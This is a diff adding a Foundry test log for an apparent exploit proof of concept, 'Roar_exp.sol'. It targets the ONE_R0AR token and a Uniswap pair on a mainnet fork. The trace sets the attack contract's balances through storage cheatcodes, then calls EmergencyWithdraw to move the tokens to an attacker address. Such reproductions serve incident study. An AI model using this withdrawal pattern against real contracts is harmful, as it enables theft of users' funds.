@@ -1,0 +1,119 @@
+No files changed, compilation skipped
+
+Ran 1 test for test/Roar_exp.sol:ContractTest
+[PASS] testPoC() (gas: 935905)
+Logs:
+  before attack: balance of attacker: 0.000000000958904109
+  before attack: balance of attacker: 0.340710205283016328
+  after attack: balance of attacker: 100000000.099978911569917741
+  after attack: balance of attacker: 27.118157177720577672
+
+Traces:
+  [3644] ContractTest::setUp()
+    ├─ [0] VM::createSelectFork("mainnet", 22278564 [2.227e7])
+    │   └─ ← [Return] 0
+    └─ ← [Stop]
+
+  [1095105] ContractTest::testPoC()
+    ├─ [2585] ONE_R0AR_Token::balanceOf(0x8149f77504007450711023cf0eC11BDd6348401F) [staticcall]
+    │   └─ ← [Return] 958904109 [9.589e8]
+    ├─ emit log_named_decimal_uint(key: "before attack: balance of attacker", val: 958904109 [9.589e8], decimals: 18)
+    ├─ [2480] UniswapV2Pair::balanceOf(0x8149f77504007450711023cf0eC11BDd6348401F) [staticcall]
+    │   └─ ← [Return] 340710205283016328 [3.407e17]
+    ├─ emit log_named_decimal_uint(key: "before attack: balance of attacker", val: 340710205283016328 [3.407e17], decimals: 18)
+    ├─ [0] VM::startPrank(0x8149f77504007450711023cf0eC11BDd6348401F, 0x8149f77504007450711023cf0eC11BDd6348401F)
+    │   └─ ← [Return]
+    ├─ [494128] → new AttackerC@0xe3e1acAF46A15fAe657e9c7b45682A51e1093796
+    │   └─ ← [Return] 2468 bytes of code
+    ├─ [2585] ONE_R0AR_Token::balanceOf(AttackerC: [0xe3e1acAF46A15fAe657e9c7b45682A51e1093796]) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ [0] VM::record()
+    │   └─ ← [Return]
+    ├─ [585] ONE_R0AR_Token::balanceOf(AttackerC: [0xe3e1acAF46A15fAe657e9c7b45682A51e1093796]) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ [0] VM::accesses(ONE_R0AR_Token: [0xb0415D55f2C87b7f99285848bd341C367FeAc1ea])
+    │   └─ ← [Return] [0xa8744596c1c5cd6d01f31e4a9dd125b7b3a9bcecd7477146f77876b1de1f6f37], []
+    ├─ [0] VM::load(ONE_R0AR_Token: [0xb0415D55f2C87b7f99285848bd341C367FeAc1ea], 0xa8744596c1c5cd6d01f31e4a9dd125b7b3a9bcecd7477146f77876b1de1f6f37) [staticcall]
+    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    ├─ emit WARNING_UninitedSlot(who: ONE_R0AR_Token: [0xb0415D55f2C87b7f99285848bd341C367FeAc1ea], slot: 76193993106399617948477998338738805644786735926596806903571695552055211945783 [7.619e76])
+    ├─ [0] VM::load(ONE_R0AR_Token: [0xb0415D55f2C87b7f99285848bd341C367FeAc1ea], 0xa8744596c1c5cd6d01f31e4a9dd125b7b3a9bcecd7477146f77876b1de1f6f37) [staticcall]
+    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    ├─ [585] ONE_R0AR_Token::balanceOf(AttackerC: [0xe3e1acAF46A15fAe657e9c7b45682A51e1093796]) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ [0] VM::store(ONE_R0AR_Token: [0xb0415D55f2C87b7f99285848bd341C367FeAc1ea], 0xa8744596c1c5cd6d01f31e4a9dd125b7b3a9bcecd7477146f77876b1de1f6f37, 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)
+    │   └─ ← [Return]
+    ├─ [585] ONE_R0AR_Token::balanceOf(AttackerC: [0xe3e1acAF46A15fAe657e9c7b45682A51e1093796]) [staticcall]
+    │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]
+    ├─ [0] VM::store(ONE_R0AR_Token: [0xb0415D55f2C87b7f99285848bd341C367FeAc1ea], 0xa8744596c1c5cd6d01f31e4a9dd125b7b3a9bcecd7477146f77876b1de1f6f37, 0x0000000000000000000000000000000000000000000000000000000000000000)
+    │   └─ ← [Return]
+    ├─ emit SlotFound(who: ONE_R0AR_Token: [0xb0415D55f2C87b7f99285848bd341C367FeAc1ea], fsig: 0x70a08231, keysHash: 0x0055aa5075a1085a977e5323171de5abed97a436a43976dde5de6b4ec6f1eb96, slot: 76193993106399617948477998338738805644786735926596806903571695552055211945783 [7.619e76])
+    ├─ [0] VM::load(ONE_R0AR_Token: [0xb0415D55f2C87b7f99285848bd341C367FeAc1ea], 0xa8744596c1c5cd6d01f31e4a9dd125b7b3a9bcecd7477146f77876b1de1f6f37) [staticcall]
+    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    ├─ [0] VM::store(ONE_R0AR_Token: [0xb0415D55f2C87b7f99285848bd341C367FeAc1ea], 0xa8744596c1c5cd6d01f31e4a9dd125b7b3a9bcecd7477146f77876b1de1f6f37, 0x00000000000000000000000000000000000000000052b7d2de2b3f1dc2904052)
+    │   └─ ← [Return]
+    ├─ [585] ONE_R0AR_Token::balanceOf(AttackerC: [0xe3e1acAF46A15fAe657e9c7b45682A51e1093796]) [staticcall]
+    │   └─ ← [Return] 100000000099978913875247186 [1e26]
+    ├─ [2480] UniswapV2Pair::balanceOf(AttackerC: [0xe3e1acAF46A15fAe657e9c7b45682A51e1093796]) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ [0] VM::record()
+    │   └─ ← [Return]
+    ├─ [480] UniswapV2Pair::balanceOf(AttackerC: [0xe3e1acAF46A15fAe657e9c7b45682A51e1093796]) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ [0] VM::accesses(UniswapV2Pair: [0x13028E6b95520ad16898396667d1e52cB5E550Ac])
+    │   └─ ← [Return] [0xa8744596c1c5cd6d01f31e4a9dd125b7b3a9bcecd7477146f77876b1de1f6f37], []
+    ├─ [0] VM::load(UniswapV2Pair: [0x13028E6b95520ad16898396667d1e52cB5E550Ac], 0xa8744596c1c5cd6d01f31e4a9dd125b7b3a9bcecd7477146f77876b1de1f6f37) [staticcall]
+    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    ├─ emit WARNING_UninitedSlot(who: UniswapV2Pair: [0x13028E6b95520ad16898396667d1e52cB5E550Ac], slot: 76193993106399617948477998338738805644786735926596806903571695552055211945783 [7.619e76])
+    ├─ [0] VM::load(UniswapV2Pair: [0x13028E6b95520ad16898396667d1e52cB5E550Ac], 0xa8744596c1c5cd6d01f31e4a9dd125b7b3a9bcecd7477146f77876b1de1f6f37) [staticcall]
+    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    ├─ [480] UniswapV2Pair::balanceOf(AttackerC: [0xe3e1acAF46A15fAe657e9c7b45682A51e1093796]) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ [0] VM::store(UniswapV2Pair: [0x13028E6b95520ad16898396667d1e52cB5E550Ac], 0xa8744596c1c5cd6d01f31e4a9dd125b7b3a9bcecd7477146f77876b1de1f6f37, 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)
+    │   └─ ← [Return]
+    ├─ [480] UniswapV2Pair::balanceOf(AttackerC: [0xe3e1acAF46A15fAe657e9c7b45682A51e1093796]) [staticcall]
+    │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]
+    ├─ [0] VM::store(UniswapV2Pair: [0x13028E6b95520ad16898396667d1e52cB5E550Ac], 0xa8744596c1c5cd6d01f31e4a9dd125b7b3a9bcecd7477146f77876b1de1f6f37, 0x0000000000000000000000000000000000000000000000000000000000000000)
+    │   └─ ← [Return]
+    ├─ emit SlotFound(who: UniswapV2Pair: [0x13028E6b95520ad16898396667d1e52cB5E550Ac], fsig: 0x70a08231, keysHash: 0x0055aa5075a1085a977e5323171de5abed97a436a43976dde5de6b4ec6f1eb96, slot: 76193993106399617948477998338738805644786735926596806903571695552055211945783 [7.619e76])
+    ├─ [0] VM::load(UniswapV2Pair: [0x13028E6b95520ad16898396667d1e52cB5E550Ac], 0xa8744596c1c5cd6d01f31e4a9dd125b7b3a9bcecd7477146f77876b1de1f6f37) [staticcall]
+    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    ├─ [0] VM::store(UniswapV2Pair: [0x13028E6b95520ad16898396667d1e52cB5E550Ac], 0xa8744596c1c5cd6d01f31e4a9dd125b7b3a9bcecd7477146f77876b1de1f6f37, 0x000000000000000000000000000000000000000000000001739c9a2651362352)
+    │   └─ ← [Return]
+    ├─ [480] UniswapV2Pair::balanceOf(AttackerC: [0xe3e1acAF46A15fAe657e9c7b45682A51e1093796]) [staticcall]
+    │   └─ ← [Return] 26777446973800063826 [2.677e19]
+    ├─ [25161] AttackerC::EmergencyWithdraw()
+    │   ├─ [585] ONE_R0AR_Token::balanceOf(AttackerC: [0xe3e1acAF46A15fAe657e9c7b45682A51e1093796])
+    │   │   └─ ← [Return] 100000000099978913875247186 [1e26]
+    │   ├─ [10915] ONE_R0AR_Token::transfer(0x8149f77504007450711023cf0eC11BDd6348401F, 100000000099978910611013632 [1e26])
+    │   │   ├─ emit Transfer(from: AttackerC: [0xe3e1acAF46A15fAe657e9c7b45682A51e1093796], to: 0x8149f77504007450711023cf0eC11BDd6348401F, value: 100000000099978910611013632 [1e26])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x6f7ebc28700433e8dc49cc7ac6116cef599d38b4b949666423f9ac94b4397804: 0x000000000000000000000000000000000000000000000000000000003927b72d → 0x00000000000000000000000000000000000000000052b7d2de2b3f1d3927b72d
+    │   │   │   @ 0xa8744596c1c5cd6d01f31e4a9dd125b7b3a9bcecd7477146f77876b1de1f6f37: 0x00000000000000000000000000000000000000000052b7d2de2b3f1dc2904052 → 0x00000000000000000000000000000000000000000000000000000000c2904052
+    │   │   └─ ← [Return] true
+    │   ├─ [480] UniswapV2Pair::balanceOf(AttackerC: [0xe3e1acAF46A15fAe657e9c7b45682A51e1093796]) [staticcall]
+    │   │   └─ ← [Return] 26777446973800063826 [2.677e19]
+    │   ├─ [5940] UniswapV2Pair::transfer(0x8149f77504007450711023cf0eC11BDd6348401F, 26777446972437561344 [2.677e19])
+    │   │   ├─ emit Transfer(from: AttackerC: [0xe3e1acAF46A15fAe657e9c7b45682A51e1093796], to: 0x8149f77504007450711023cf0eC11BDd6348401F, value: 26777446972437561344 [2.677e19])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0xa8744596c1c5cd6d01f31e4a9dd125b7b3a9bcecd7477146f77876b1de1f6f37: 0x000000000000000000000000000000000000000000000001739c9a2651362352 → 0x0000000000000000000000000000000000000000000000000000000051362352
+    │   │   │   @ 0x6f7ebc28700433e8dc49cc7ac6116cef599d38b4b949666423f9ac94b4397804: 0x00000000000000000000000000000000000000000000000004ba7220653e9e88 → 0x00000000000000000000000000000000000000000000000178570c46653e9e88
+    │   │   └─ ← [Return] true
+    │   └─ ← [Stop]
+    ├─ [0] VM::stopPrank()
+    │   └─ ← [Return]
+    ├─ [585] ONE_R0AR_Token::balanceOf(0x8149f77504007450711023cf0eC11BDd6348401F) [staticcall]
+    │   └─ ← [Return] 100000000099978911569917741 [1e26]
+    ├─ emit log_named_decimal_uint(key: "after attack: balance of attacker", val: 100000000099978911569917741 [1e26], decimals: 18)
+    ├─ [480] UniswapV2Pair::balanceOf(0x8149f77504007450711023cf0eC11BDd6348401F) [staticcall]
+    │   └─ ← [Return] 27118157177720577672 [2.711e19]
+    ├─ emit log_named_decimal_uint(key: "after attack: balance of attacker", val: 27118157177720577672 [2.711e19], decimals: 18)
+    ├─  storage changes:
+    │   @ 0xc4349994a92d2a4e60d7a94231c023e7372872317101cafde6c32ad5395c83ce: 0 → 1
+    │   @ 0x4d92df54357661565ccc3ce83d4e42120ad64206ec6fef943e4d49e83d59c7be: 0 → 1
+    │   @ 0x4d92df54357661565ccc3ce83d4e42120ad64206ec6fef943e4d49e83d59c7bb: 0 → 0xa8744596c1c5cd6d01f31e4a9dd125b7b3a9bcecd7477146f77876b1de1f6f37
+    │   @ 0xc4349994a92d2a4e60d7a94231c023e7372872317101cafde6c32ad5395c83cb: 0 → 0xa8744596c1c5cd6d01f31e4a9dd125b7b3a9bcecd7477146f77876b1de1f6f37
+    └─ ← [Stop]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 3.59s (2.31s CPU time)
+
+Ran 1 test suite in 5.17s (3.59s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
